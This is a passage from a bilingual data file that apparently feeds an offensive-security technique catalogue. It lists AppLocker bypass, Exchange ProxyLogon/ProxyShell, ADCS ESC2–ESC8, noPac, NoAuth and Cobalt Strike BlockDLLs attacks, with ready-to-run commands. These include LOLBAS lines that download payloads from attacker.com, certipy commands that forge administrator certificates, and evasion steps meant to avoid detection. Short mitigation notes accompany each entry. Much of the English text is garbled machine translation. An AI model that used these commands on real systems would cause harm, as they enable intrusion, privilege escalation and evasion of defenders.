    id: 'applocker-bypass',
    name: { zh: 'AppLocker绕过', en: 'AppLocker Bypass' },
    description: { zh: '绕过AppLocker应用程序限制', en: 'BypassAppLockerApplicationRestrict' },
    category: { zh: '免杀与规避', en: 'Evasion & Anti-Detection' },
    subCategory: 'AppLocker',
    tags: ['applocker', 'bypass', 'evasion'],
    prerequisites: [{ zh: 'AppLocker限制环境', en: 'AppLockerRestrictEnvironment' }],
    execution: [
      {
        title: { zh: '使用白名单路径', en: 'UseWhitelistPath' },
        command: 'C:\\Windows\\System32\\spoolsv.exe\nC:\\Windows\\System32\\svchost.exe\nC:\\Program Files\\Internet Explorer\\ieexec.exe',
        description: { zh: '使用白名单可执行文件', en: 'UseWhitelistCanExecuteFile' },
        platform: 'windows'
      },
      {
        title: { zh: 'LOLBAS利用', en: 'LOLBASExploitation' },
        command: 'regsvr32.exe /s /n /u /i:http://attacker.com/shell.sct scrobj.dll\nmshta.exe http://attacker.com/shell.hta\ncertutil.exe -urlcache -split -f http://attacker.com/shell.exe shell.exe',
        description: { zh: 'LOLBAS技术', en: 'LOLBASTechnique' },
        platform: 'windows'
      },
      {
        title: 'InstallUtil',
        command: 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U shell.exe',
        description: { zh: 'InstallUtil绕过', en: 'InstallUtilBypass' },
        platform: 'windows'
      },
      {
        title: 'MSBuild',
        command: 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe shell.csproj',
        description: { zh: 'MSBuild执行代码', en: 'MSBuildExecuteCode' },
        platform: 'windows'
      }
    ],
    tutorial: {
      overview: { zh: 'AppLocker可限制程序执行，但存在绕过方法。', en: 'AppLockerCanRestrictProgramExecute, but hasBypassMethod.' },
      vulnerability: { zh: 'AppLocker规则不完善。', en: 'AppLocker rules are incomplete.' },
      exploitation: { zh: '利用流程：1) 分析限制规则 2) 找到白名单路径 3) 使用LOLBAS', en: 'Exploitationworkflow: 1) AnalyzeRestrictRule 2) Find to WhitelistPath 3) UseLOLBAS' },
      mitigation: { zh: '防御措施：1) 完善规则 2) 监控LOLBAS 3) 使用WDAC', en: 'Defenses: 1) Harden rules 2) Monitor LOLBAS usage 3) Use WDAC' },
      difficulty: 'intermediate'
    }
  },
  {
    id: 'proxylogon',
    name: { zh: 'ProxyLogon攻击', en: 'ProxyLogon Attack' },
    description: 'CVE-2021-26855 Exchange SSRF',
    category: { zh: 'Exchange攻击', en: 'Exchange Attacks' },
    subCategory: 'ProxyLogon',
    tags: ['exchange', 'proxylogon', 'cve-2021-26855'],
    prerequisites: [{ zh: 'Exchange可访问', en: 'ExchangeCanAccess' }],
    execution: [
      {
        title: { zh: '探测漏洞', en: 'DetectVulnerability' },
        command: 'curl -k https://exchange.com/owa/auth/x.js\n检查Exchange版本',
        description: { zh: '检查Exchange版本', en: 'CheckExchangeVersion' },
        platform: 'linux'
      },
      {
        title: { zh: '利用脚本', en: 'ExploitationScript' },
        command: 'python proxylogon.py -u https://exchange.com -e admin@domain.com\n获取管理员邮箱访问权限',
        description: { zh: '利用ProxyLogon', en: 'ExploitationProxyLogon' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: '-u', explanation: 'Exchange URL' , type: 'parameter' },
          { part: '-e', explanation: { zh: '目标邮箱', en: 'Target Mailbox' } , type: 'parameter' }
        ]
      },
      {
        title: { zh: '手动利用', en: 'ManualExploitation' },
        command: 'POST /owa/auth/x.js HTTP/1.1\nCookie: X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3;\nX-ClientId=xxx\n\n构造SSRF请求',
        description: { zh: '手动构造请求', en: 'ManualConstructRequest' },
        platform: 'all'
      }
    ],
    tutorial: {
      overview: { zh: 'ProxyLogon是Exchange的SSRF漏洞。', en: 'ProxyLogon is Exchange SSRFVulnerability.' },
      vulnerability: { zh: 'Exchange前端存在SSRF漏洞。', en: 'ExchangeFrontendhasSSRFVulnerability.' },
      exploitation: { zh: '利用流程：1) 探测Exchange 2) 构造SSRF请求 3) 获取访问权限', en: 'Exploitationworkflow: 1) DetectExchange 2) ConstructSSRFRequest 3) ObtainAccessPermission' },
      mitigation: { zh: '防御措施：1) 安装补丁 2) 网络隔离 3) 监控异常请求', en: 'Defensemeasures: 1) InstallationPatch 2) NetworkIsolation 3) MonitoringExceptionRequest' },
      difficulty: 'advanced'
    }
  },
  {
    id: 'proxyshell',
    name: { zh: 'ProxyShell攻击', en: 'ProxyShell Attack' },
    description: 'CVE-2021-34473 Exchange RCE',
    category: { zh: 'Exchange攻击', en: 'Exchange Attacks' },
    subCategory: 'ProxyShell',
    tags: ['exchange', 'proxyshell', 'cve-2021-34473'],
    prerequisites: [{ zh: 'Exchange可访问', en: 'ExchangeCanAccess' }],
    execution: [
      {
        title: { zh: '探测漏洞', en: 'DetectVulnerability' },
        command: 'curl -k "https://exchange.com/autodiscover/autodiscover.json?@foo.com/mapi/nspi?&Email=autodiscover/autodiscover.json%3f@foo.com"\n检查是否存在漏洞',
        description: { zh: '探测漏洞', en: 'DetectVulnerability' },
        platform: 'linux'
      },
      {
        title: { zh: '利用脚本', en: 'ExploitationScript' },
        command: 'python proxyshell.py -u https://exchange.com -e admin@domain.com\n获取邮箱访问并执行命令',
        description: { zh: '利用ProxyShell', en: 'ExploitationProxyShell' },
        platform: 'linux'
      },
      {
        title: { zh: '获取邮件', en: 'Retrieve Emails' },
        command: 'GET /autodiscover/autodiscover.json?@domain.com/owa/?&Email=admin@domain.com HTTP/1.1\n访问邮箱内容',
        description: { zh: '访问邮箱', en: 'Access Mailbox' },
        platform: 'all'
      }
    ],
    tutorial: {
      overview: { zh: 'ProxyShell是Exchange的RCE漏洞链。', en: 'ProxyShell is Exchange RCEVulnerabilityChain.' },
      vulnerability: { zh: 'Exchange存在SSRF和RCE漏洞。', en: 'ExchangehasSSRF and RCEVulnerability.' },
      exploitation: { zh: '利用流程：1) 探测漏洞 2) 获取访问令牌 3) 执行命令', en: 'Exploitationworkflow: 1) DetectVulnerability 2) ObtainAccessToken 3) Execute Command' },
      mitigation: { zh: '防御措施：1) 安装补丁 2) 网络隔离 3) 监控异常请求', en: 'Defensemeasures: 1) InstallationPatch 2) NetworkIsolation 3) MonitoringExceptionRequest' },
      difficulty: 'advanced'
    }
  },
  {
    id: 'exchange-enum',
    name: { zh: 'Exchange枚举', en: 'Exchange Enumeration' },
    description: { zh: '枚举Exchange服务和配置', en: 'EnumerationExchangeService and Configuration' },
    category: { zh: 'Exchange攻击', en: 'Exchange Attacks' },
    subCategory: { zh: '枚举', en: 'Enumeration' },
    tags: ['exchange', 'enum', 'recon'],
    prerequisites: [{ zh: 'Exchange可访问', en: 'ExchangeCanAccess' }],
    execution: [
      {
        title: { zh: '版本探测', en: 'VersionDetect' },
        command: 'curl -k https://exchange.com/owa/auth/logon.aspx\n检查页面源码获取版本信息',
        description: { zh: '探测Exchange版本', en: 'DetectExchangeVersion' },
        platform: 'linux'
      },
      {
        title: 'Autodiscover',
        command: 'curl -k -u user:pass https://exchange.com/autodiscover/autodiscover.xml\n获取Exchange配置信息',
        description: { zh: 'Autodiscover枚举', en: 'AutodiscoverEnumeration' },
        platform: 'linux'
      },
      {
        title: { zh: '邮箱枚举', en: 'Mailbox Enumeration' },
        command: 'python oab.py https://exchange.com\n下载离线通讯录枚举用户',
        description: { zh: '枚举邮箱用户', en: 'Enumerate Mailbox Users' },
        platform: 'linux'
      },
      {
        title: { zh: 'NTLM泄露', en: 'NTLMLeak' },
        command: 'curl -k https://exchange.com/autodiscover/autodiscover.xml\n从WWW-Authenticate头获取域信息',
        description: { zh: 'NTLM信息泄露', en: 'NTLMInformationLeak' },
        platform: 'linux'
      }
    ],
    tutorial: {
      overview: { zh: 'Exchange枚举可获取大量信息。', en: 'Exchange enumeration can yield a large amount of information.' },
      vulnerability: { zh: 'Exchange暴露过多信息。', en: 'Exchange exposes excessive information.' },
      exploitation: { zh: '利用流程：1) 探测版本 2) 枚举用户 3) 获取配置', en: 'Exploitationworkflow: 1) DetectVersion 2) EnumerationUsers 3) ObtainConfiguration' },
      mitigation: { zh: '防御措施：1) 隐藏版本信息 2) 限制访问 3) 监控异常请求', en: 'Defensemeasures: 1) HiddenVersionInformation 2) RestrictAccess 3) MonitoringExceptionRequest' },
      difficulty: 'beginner'
    }
  },
  {
    id: 'sharepoint-enum',
    name: { zh: 'SharePoint枚举', en: 'SharePoint Enumeration' },
    description: { zh: '枚举SharePoint站点和文件', en: 'Enumerate SharePoint Sites and Files' },
    category: { zh: 'SharePoint攻击', en: 'SharePoint Attacks' },
    subCategory: { zh: '枚举', en: 'Enumeration' },
    tags: ['sharepoint', 'enum', 'recon'],
    prerequisites: [{ zh: 'SharePoint可访问', en: 'SharePointCanAccess' }],
    execution: [
      {
        title: { zh: '站点枚举', en: 'Site Enumeration' },
        command: 'curl -k https://sharepoint.com/_api/web/webs\n获取所有子站点',
        description: { zh: '枚举站点', en: 'Enumerate Sites' },
        platform: 'linux'
      },
      {
        title: { zh: '用户枚举', en: 'User Enumeration' },
        command: 'curl -k https://sharepoint.com/_api/web/siteusers\n获取站点用户列表',
        description: { zh: '枚举用户', en: 'EnumerationUsers' },
        platform: 'linux'
      },
      {
        title: { zh: '文件枚举', en: 'FileEnumeration' },
        command: 'curl -k https://sharepoint.com/_api/web/lists\n获取文档库列表',
        description: { zh: '枚举文档库', en: 'EnumerationDocumentationdatabase' },
        platform: 'linux'
      },
      {
        title: { zh: '搜索文件', en: 'SearchFile' },
        command: 'curl -k "https://sharepoint.com/_api/search/query?querytext=\'password\'"\n搜索敏感文件',
        description: { zh: '搜索敏感内容', en: 'SearchSensitiveContent' },
        platform: 'linux'
      }
    ],
    tutorial: {
      overview: { zh: 'SharePoint REST API可用于枚举。', en: 'SharePoint REST APICan used for Enumeration.' },
      vulnerability: { zh: 'SharePoint API暴露过多信息。', en: 'The SharePoint API exposes excessive information.' },
      exploitation: { zh: '利用流程：1) 枚举站点 2) 枚举用户 3) 搜索敏感文件', en: 'Exploitation workflow: 1) Enumerate sites 2) Enumerate users 3) Search for sensitive files' },
      mitigation: { zh: '防御措施：1) 限制API访问 2) 配置权限 3) 监控异常请求', en: 'Defensemeasures: 1) RestrictAPIAccess 2) ConfigurationPermission 3) MonitoringExceptionRequest' },
      difficulty: 'intermediate'
    }
  },
  {
    id: 'adcs-esc2',
    name: { zh: 'ADCS ESC2攻击', en: 'ADCS ESC2 Attack' },
    description: { zh: '利用ESC2模板配置错误', en: 'ExploitationESC2TemplateConfigurationError' },
    category: { zh: 'ADCS攻击', en: 'ADCS Attacks' },
    subCategory: 'ESC2',
    tags: ['adcs', 'esc2', 'certificate'],
    prerequisites: [{ zh: '域环境', en: 'DomainEnvironment' }, { zh: 'ADCS服务', en: 'ADCSService' }, { zh: '存在ESC2模板', en: 'hasESC2Template' }],
    execution: [
      {
        title: { zh: '探测ESC2模板', en: 'DetectESC2Template' },
        command: 'certipy find -u user@domain.com -p password -dc-ip DC_IP\n查找Any Purpose或CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT模板',
        description: { zh: '探测ESC2模板', en: 'DetectESC2Template' },
        platform: 'linux'
      },
      {
        title: { zh: '请求证书', en: 'RequestCertificate' },
        command: 'certipy req -u user@domain.com -p password -ca CA_NAME -target DC_IP -template VULNERABLE_TEMPLATE -upn administrator@domain.com',
        description: { zh: '请求管理员证书', en: 'RequestManagementMemberCertificate' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: '-template', explanation: { zh: '指定易受攻击模板', en: 'Specify Vulnerable Template' } , type: 'parameter' },
          { part: '-upn', explanation: { zh: '指定目标用户UPN', en: 'specifiedTargetUsersUPN' } , type: 'parameter' }
        ]
      },
      {
        title: { zh: '使用证书认证', en: 'UseCertificate Authentication' },
        command: 'certipy auth -pfx administrator.pfx -dc-ip DC_IP\n获取管理员TGT',
        description: { zh: '使用证书认证', en: 'UseCertificate Authentication' },
        platform: 'linux'
      }
    ],
    tutorial: {
      overview: { zh: 'ESC2允许请求任意用途的证书，可用于伪造任意用户身份。', en: 'ESC2 allows requesting certificates for any purpose, which can be used to forge any user identity.' },
      vulnerability: { zh: '证书模板配置允许Any Purpose扩展。', en: 'CertificateTemplateConfigurationAllowAny PurposeExtension.' },
      exploitation: { zh: '利用流程：1) 发现ESC2模板 2) 请求管理员证书 3) 使用证书认证', en: 'Exploitationworkflow: 1) DiscoverESC2Template 2) RequestManagementMemberCertificate 3) UseCertificate Authentication' },
      mitigation: { zh: '防御措施：1) 审计证书模板 2) 禁用Any Purpose 3) 监控证书请求', en: 'Defensemeasures: 1) AuditCertificateTemplate 2) DisableAny Purpose 3) MonitoringCertificateRequest' },
      difficulty: 'advanced'
    }
  },
  {
    id: 'adcs-esc3',
    name: { zh: 'ADCS ESC3攻击', en: 'ADCS ESC3 Attack' },
    description: { zh: '利用ESC3注册代理配置错误', en: 'ExploitationESC3RegisterProxyConfigurationError' },
    category: { zh: 'ADCS攻击', en: 'ADCS Attacks' },
    subCategory: 'ESC3',
    tags: ['adcs', 'esc3', 'certificate'],
    prerequisites: [{ zh: '域环境', en: 'DomainEnvironment' }, { zh: 'ADCS服务', en: 'ADCSService' }, { zh: '存在ESC3配置', en: 'hasESC3Configuration' }],
    execution: [
      {
        title: { zh: '探测ESC3', en: 'DetectESC3' },
        command: 'certipy find -u user@domain.com -p password -dc-ip DC_IP\n查找具有Enrollment Agent权限的模板',
        description: { zh: '探测ESC3配置', en: 'DetectESC3Configuration' },
        platform: 'linux'
      },
      {
        title: { zh: '获取注册代理证书', en: 'ObtainRegisterProxyCertificate' },
        command: 'certipy req -u user@domain.com -p password -ca CA_NAME -template EnrollmentAgent\n获取注册代理证书',
        description: { zh: '获取注册代理证书', en: 'ObtainRegisterProxyCertificate' },
        platform: 'linux'
      },
      {
        title: { zh: '代表其他用户请求证书', en: 'Request Certificates on Behalf of Other Users' },
        command: 'certipy req -u user@domain.com -p password -ca CA_NAME -template User -on-behalf-of DOMAIN\\\\Administrator -pfx agent.pfx',
        description: { zh: '代表管理员请求证书', en: 'Request Certificates on Behalf of Administrators' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: '-on-behalf-of', explanation: { zh: '代表其他用户请求', en: 'Request on Behalf of Other Users' } , type: 'parameter' },
          { part: '-pfx agent.pfx', explanation: { zh: '使用代理证书', en: 'Using ProxyCertificate' } , type: 'parameter' }
        ]
      }
    ],
    tutorial: {
      overview: { zh: 'ESC3允许注册代理代表其他用户请求证书。', en: 'ESC3 allows enrollment agents to request certificates on behalf of other users.' },
      vulnerability: { zh: '证书模板允许注册代理功能。', en: 'CertificateTemplateAllowRegisterProxyFunction.' },
      exploitation: { zh: '利用流程：1) 获取代理证书 2) 代表管理员请求证书 3) 使用证书认证', en: 'Exploitation workflow: 1) Obtain enrollment agent certificate 2) Request certificate on behalf of admin 3) Authenticate with certificate' },
      mitigation: { zh: '防御措施：1) 限制注册代理权限 2) 审计代理证书 3) 监控异常请求', en: 'Defensemeasures: 1) RestrictRegisterProxyPermission 2) AuditProxyCertificate 3) MonitoringExceptionRequest' },
      difficulty: 'advanced'
    }
  },
  {
    id: 'adcs-esc4',
    name: { zh: 'ADCS ESC4攻击', en: 'ADCS ESC4 Attack' },
    description: { zh: '利用ESC4模板权限配置错误', en: 'ExploitationESC4TemplatePermissionConfigurationError' },
    category: { zh: 'ADCS攻击', en: 'ADCS Attacks' },
    subCategory: 'ESC4',
    tags: ['adcs', 'esc4', 'certificate'],
    prerequisites: [{ zh: '域环境', en: 'DomainEnvironment' }, { zh: 'ADCS服务', en: 'ADCSService' }, { zh: '对模板有写权限', en: 'Write permissions on the template' }],
    execution: [
      {
        title: { zh: '探测ESC4', en: 'DetectESC4' },
        command: 'certipy find -u user@domain.com -p password -dc-ip DC_IP\n查找用户有写权限的模板',
        description: { zh: '探测模板权限', en: 'DetectTemplatePermission' },
        platform: 'linux'
      },
      {
        title: { zh: '修改模板配置', en: 'ModifyTemplateConfiguration' },
        command: 'certipy template -u user@domain.com -p password -template VULNERABLE_TEMPLATE -save-old\n修改模板为ESC1配置',
        description: { zh: '修改模板配置', en: 'ModifyTemplateConfiguration' },
        platform: 'linux'
      },
      {
        title: { zh: '请求证书', en: 'RequestCertificate' },
        command: 'certipy req -u user@domain.com -p password -ca CA_NAME -template VULNERABLE_TEMPLATE -upn administrator@domain.com',
        description: { zh: '请求管理员证书', en: 'RequestManagementMemberCertificate' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: '-save-old', explanation: { zh: '保存原配置以便恢复', en: 'Save original configuration for later restoration' } , type: 'parameter' },
          { part: '修改模板', explanation: { zh: '启用SAN扩展', en: 'EnableSANExtension' } , type: 'keyword' }
        ]
      },
      {
        title: { zh: '恢复模板配置', en: 'RecoveryTemplateConfiguration' },
        command: 'certipy template -u user@domain.com -p password -template VULNERABLE_TEMPLATE -configuration old_config.json\n恢复原配置避免检测',
        description: { zh: '恢复模板配置', en: 'RecoveryTemplateConfiguration' },
        platform: 'linux'
      }
    ],
    tutorial: {
      overview: { zh: 'ESC4允许修改证书模板配置来提权。', en: 'ESC4AllowModifyCertificateTemplateConfigurationSourcePrivilege escalation.' },
      vulnerability: { zh: '用户对证书模板有写权限。', en: 'The user has write permissions on the certificate template.' },
      exploitation: { zh: '利用流程：1) 发现可写模板 2) 修改配置 3) 请求证书 4) 恢复配置', en: 'Exploitationworkflow: 1) DiscoverwritableTemplate 2) ModifyConfiguration 3) RequestCertificate 4) RecoveryConfiguration' },
      mitigation: { zh: '防御措施：1) 审计模板权限 2) 限制写权限 3) 监控模板修改', en: 'Defenses: 1) Audit template permissions 2) Restrict write permissions 3) Monitor template modifications' },
      difficulty: 'advanced'
    }
  },
  {
    id: 'adcs-esc6',
    name: { zh: 'ADCS ESC6攻击', en: 'ADCS ESC6 Attack' },
    description: { zh: '利用ESC6编辑标志配置错误', en: 'Exploit ESC6 EDITF_ATTRIBUTESUBJECTALTNAME2 Misconfiguration' },
    category: { zh: 'ADCS攻击', en: 'ADCS Attacks' },
    subCategory: 'ESC6',
    tags: ['adcs', 'esc6', 'certificate'],
    prerequisites: [{ zh: '域环境', en: 'DomainEnvironment' }, { zh: 'ADCS服务', en: 'ADCSService' }, { zh: 'CA启用EDITF_ATTRIBUTESUBJECTALTNAME2', en: 'CAEnableEDITF_ATTRIBUTESUBJECTALTNAME2' }],
    execution: [
      {
        title: { zh: '探测ESC6', en: 'DetectESC6' },
        command: 'certipy find -u user@domain.com -p password -dc-ip DC_IP\n查找EDITF_ATTRIBUTESUBJECTALTNAME2标志',
        description: { zh: '探测CA配置', en: 'DetectCAConfiguration' },
        platform: 'linux'
      },
      {
        title: { zh: '请求证书', en: 'RequestCertificate' },
        command: 'certipy req -u user@domain.com -p password -ca CA_NAME -template User -alt administrator@domain.com\n使用-alt参数指定SAN',
        description: { zh: '请求管理员证书', en: 'RequestManagementMemberCertificate' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: '-alt', explanation: { zh: '指定Subject Alternative Name', en: 'specifiedSubject Alternative Name' } , type: 'parameter' },
          { part: 'EDITF_ATTRIBUTESUBJECTALTNAME2', explanation: { zh: 'CA允许在请求中指定SAN', en: 'CAAllow in RequestMiddlespecifiedSAN' } , type: 'keyword' }
        ]
      },
      {
        title: { zh: '使用证书认证', en: 'UseCertificate Authentication' },
        command: 'certipy auth -pfx administrator.pfx -dc-ip DC_IP',
        description: { zh: '认证获取TGT', en: 'AuthenticationObtainTGT' },
        platform: 'linux'
      }
    ],
    tutorial: {
      overview: { zh: 'ESC6允许在证书请求中指定任意SAN。', en: 'ESC6Allow in CertificateRequestMiddlespecifiedArbitrarySAN.' },
      vulnerability: { zh: 'CA配置了EDITF_ATTRIBUTESUBJECTALTNAME2标志。', en: 'CAConfiguration EDITF_ATTRIBUTESUBJECTALTNAME2flag.' },
      exploitation: { zh: '利用流程：1) 探测CA配置 2) 请求带管理员SAN的证书 3) 认证', en: 'Exploitation workflow: 1) Detect CA configuration 2) Request certificate with admin SAN 3) Authenticate' },
      mitigation: { zh: '防御措施：1) 移除EDITF_ATTRIBUTESUBJECTALTNAME2标志 2) 监控证书请求 3) 审计CA配置', en: 'Defensemeasures: 1) RemoveEDITF_ATTRIBUTESUBJECTALTNAME2flag 2) MonitoringCertificateRequest 3) AuditCAConfiguration' },
      difficulty: 'advanced'
    }
  },
  {
    id: 'adcs-esc8',
    name: { zh: 'ADCS ESC8攻击', en: 'ADCS ESC8 Attack' },
    description: { zh: '利用ESC8 HTTP端点进行NTLM中继', en: 'ExploitationESC8 HTTPEndpoint perform NTLMRelay' },
    category: { zh: 'ADCS攻击', en: 'ADCS Attacks' },
    subCategory: 'ESC8',
    tags: ['adcs', 'esc8', 'ntlm-relay'],
    prerequisites: [{ zh: '域环境', en: 'DomainEnvironment' }, { zh: 'ADCS HTTP端点', en: 'ADCS HTTPEndpoint' }, { zh: '可触发NTLM认证', en: 'CanTriggerNTLMAuthentication' }],
    execution: [
      {
        title: { zh: '探测ESC8', en: 'DetectESC8' },
        command: 'certipy find -u user@domain.com -p password -dc-ip DC_IP\n查找HTTP证书端点',
        description: { zh: '探测HTTP端点', en: 'DetectHTTPEndpoint' },
        platform: 'linux'
      },
      {
        title: { zh: '设置NTLM中继', en: 'SetNTLMRelay' },
        command: 'impacket-ntlmrelayx -t http://CA_SERVER/certsrv/certfnsh.asp -smb2support --adcs\n监听NTLM认证并中继到ADCS',
        description: { zh: '设置NTLM中继', en: 'SetNTLMRelay' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: '-t http://CA_SERVER', explanation: { zh: '目标ADCS HTTP端点', en: 'TargetADCS HTTPEndpoint' } , type: 'parameter' },
          { part: '--adcs', explanation: { zh: '启用ADCS模板', en: 'EnableADCSTemplate' } , type: 'parameter' }
        ]
      },
      {
        title: { zh: '触发认证', en: 'TriggerAuthentication' },
        command: '使用多种方式触发:\n- 发送邮件链接\n- 打印机漏洞\n- WebDAV\n- 其他NTLM触发方式',
        description: { zh: '触发目标NTLM认证', en: 'TriggerTargetNTLMAuthentication' },
        platform: 'all'
      }
    ],
    tutorial: {
      overview: { zh: 'ESC8利用ADCS HTTP端点进行NTLM中继攻击。', en: 'ESC8ExploitationADCS HTTPEndpoint perform NTLMRelayAttack.' },
      vulnerability: { zh: 'ADCS HTTP端点支持NTLM认证且未启用签名。', en: 'The ADCS HTTP endpoint supports NTLM authentication and signing is not enforced.' },
      exploitation: { zh: '利用流程：1) 设置中继服务器 2) 触发目标认证 3) 获取证书', en: 'Exploitationworkflow: 1) SetRelayServer 2) TriggerTargetAuthentication 3) ObtainCertificate' },
      mitigation: { zh: '防御措施：1) 启用通道绑定 2) 禁用HTTP端点 3) 启用Extended Protection', en: 'Defensemeasures: 1) Enablechannelbinding 2) DisableHTTPEndpoint 3) EnableExtended Protection' },
      difficulty: 'advanced'
    }
  },
  {
    id: 'sam-the-admin',
    name: { zh: 'SAM The Admin攻击', en: 'SAM The Admin Attack' },
    description: { zh: 'CVE-2021-42278/CVE-2021-42287域提权', en: 'CVE-2021-42278/CVE-2021-42287DomainPrivilege escalation' },
    category: { zh: '域渗透攻击', en: 'Active Directory Attacks' },
    subCategory: 'SAM The Admin',
    tags: ['ad', 'cve-2021-42278', 'privilege'],
    prerequisites: [{ zh: '域用户权限', en: 'Domain UsersPermission' }, { zh: '域控制器存在漏洞', en: 'DomainControllerhasVulnerability' }],
    execution: [
      {
        title: { zh: '检测漏洞', en: 'DetectionVulnerability' },
        command: 'python noPac.py domain.com/user:password -dc-ip DC_IP\n检测是否存在漏洞',
        description: { zh: '检测漏洞', en: 'DetectionVulnerability' },
        platform: 'linux'
      },
      {
        title: { zh: '利用漏洞', en: 'ExploitationVulnerability' },
        command: 'python noPac.py domain.com/user:password -dc-ip DC_IP -dc-host DC_NAME -shell\n获取SYSTEM Shell',
        description: { zh: '获取域控权限', en: 'Get Domain ControllersPermission' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'CVE-2021-42278', explanation: { zh: 'sAMAccountName欺骗', en: 'sAMAccountNameSpoofing' } , type: 'keyword' },
          { part: 'CVE-2021-42287', explanation: { zh: 'Kerberos PAC验证绕过', en: 'Kerberos PACVerifyBypass' } , type: 'keyword' }
        ]
      },
      {
        title: { zh: '执行命令', en: 'Execute Command' },
        command: 'python noPac.py domain.com/user:password -dc-ip DC_IP -dc-host DC_NAME -command "whoami"',
        description: { zh: '执行命令', en: 'Execute Command' },
        platform: 'linux'
      }
    ],
    tutorial: {
      overview: { zh: 'SAM The Admin利用sAMAccountName欺骗和PAC验证绕过提权。', en: 'SAM The AdminExploitationsAMAccountNameSpoofing and PACVerifyBypassPrivilege escalation.' },
      vulnerability: { zh: '域控制器未安装相关补丁。', en: 'DomainController not yet InstallationrelatedPatch.' },
      exploitation: { zh: '利用流程：1) 创建机器账户 2) 修改sAMAccountName 3) 请求TGT 4) 删除账户 5) 请求S4U2Self', en: 'Exploitationworkflow: 1) CreateMachineAccount 2) ModifysAMAccountName 3) Request TGT 4) DeleteAccount 5) RequestS4U2Self' },
      mitigation: { zh: '防御措施：1) 安装KB5008102补丁 2) 监控异常账户创建 3) 审计sAMAccountName修改', en: 'Defensemeasures: 1) InstallationKB5008102Patch 2) MonitoringExceptionAccountCreate 3) AuditsAMAccountNameModify' },
      difficulty: 'advanced'
    }
  },
  {
    id: 'noauth',
    name: { zh: 'NoAuth攻击', en: 'NoAuth Attack' },
    description: { zh: 'CVE-2022-33679 Kerberos认证绕过', en: 'CVE-2022-33679 KerberosAuthentication Bypass' },
    category: { zh: '域渗透攻击', en: 'Active Directory Attacks' },
    subCategory: 'NoAuth',
    tags: ['ad', 'cve-2022-33679', 'kerberos'],
    prerequisites: [{ zh: '域用户权限', en: 'Domain UsersPermission' }, { zh: '目标账户有RC4密钥', en: 'TargetAccount has RC4key' }],
    execution: [
      {
        title: { zh: '检测漏洞', en: 'DetectionVulnerability' },
        command: 'python NoAuth.py domain.com/user:password -dc-ip DC_IP -target administrator\n检测是否存在漏洞',
        description: { zh: '检测漏洞', en: 'DetectionVulnerability' },
        platform: 'linux'
      },
      {
        title: { zh: '利用漏洞', en: 'ExploitationVulnerability' },
        command: 'python NoAuth.py domain.com/user:password -dc-ip DC_IP -target administrator\n获取目标用户TGT',
        description: { zh: '获取TGT', en: 'ObtainTGT' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'CVE-2022-33679', explanation: { zh: 'Kerberos RC4弱验证', en: 'Kerberos RC4 Weak Verification' } , type: 'keyword' },
          { part: 'RC4密钥', explanation: { zh: '利用RC4加密类型绕过验证', en: 'ExploitationRC4EncryptionTypeBypassVerify' } , type: 'keyword' }
        ]
      },
      {
        title: { zh: '使用TGT', en: 'UseTGT' },
        command: '设置KRB5CCNAME环境变量\nexport KRB5CCNAME=administrator.ccache\n使用psexec.py等工具',
        description: { zh: '使用获取的TGT', en: 'UseObtain TGT' },
        platform: 'linux'
      }
    ],
    tutorial: {
      overview: { zh: 'NoAuth利用Kerberos RC4加密的验证缺陷。', en: 'NoAuth exploits the Kerberos RC4 encryption verification flaw.' },
      vulnerability: { zh: 'Kerberos RC4加密验证存在缺陷。', en: 'Kerberos RC4 encryption verification has flaws.' },
      exploitation: { zh: '利用流程：1) 检测目标RC4密钥 2) 构造恶意请求 3) 获取TGT', en: 'Exploitationworkflow: 1) DetectionTargetRC4key 2) ConstructMaliciousRequest 3) ObtainTGT' },
      mitigation: { zh: '防御措施：1) 安装补丁 2) 禁用RC4加密 3) 强制AES加密', en: 'Defenses: 1) Install patches 2) Disable RC4 encryption 3) Enforce AES encryption' },
      difficulty: 'advanced'
    }
  },
  {
    id: 'evasion-blockdlls',
    name: { zh: 'BlockDLLs技术', en: 'BlockDLLs Technique' },
    description: { zh: '阻止非微软DLL加载', en: 'Block Non-Microsoft DLL Loading' },
    category: { zh: '免杀与规避', en: 'Evasion & Anti-Detection' },
    subCategory: 'BlockDLLs',
    tags: ['evasion', 'blockdlls', 'edr'],
    prerequisites: [{ zh: 'Windows系统', en: 'WindowsSystem' }, { zh: 'Cobalt Strike或其他工具', en: 'Cobalt Strike or otherTools' }],
    execution: [
      {
        title: 'Cobalt Strike BlockDLLs',
        command: 'beacon> blockdlls start\n阻止非微软签名的DLL加载\nbeacon> blockdlls stop\n恢复DLL加载',
        description: { zh: '启用BlockDLLs', en: 'EnableBlockDLLs' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'blockdlls start', explanation: { zh: '启用DLL过滤', en: 'EnableDLLFilter' } , type: 'keyword' },
          { part: '非微软签名', explanation: { zh: '只允许微软签名DLL', en: 'Only Allow Microsoft-Signed DLLs' } , type: 'keyword' }
        ]
      },
      {
        title: { zh: '进程创建时启用', en: 'ProcessCreateWhenEnable' },
        command: '使用CREATE_SUSPENDED标志创建进程\n设置ProcessSignaturePolicy\n阻止EDR DLL注入',
        description: { zh: '进程创建时启用', en: 'ProcessCreateWhenEnable' },
        platform: 'windows'
      },
      {
        title: { zh: 'C#实现', en: 'C# implementation' },
        command: '[DllImport("kernel32.dll")]\nstatic extern bool SetProcessMitigationPolicy(...);\nProcessSignaturePolicy policy = new ProcessSignaturePolicy();\npolicy.SignatureLevel = 0x0F;\nSetProcessMitigationPolicy(ProcessMitigationPolicy.Signature, ref policy, size);',
        description: { zh: 'C#实现BlockDLLs', en: 'C# implementationBlockDLLs' },
        platform: 'windows'
      }
    ],
    tutorial: {
      overview: { zh: 'BlockDLLs可阻止EDR的DLL注入。', en: 'BlockDLLs can prevent EDR DLL injection.' },
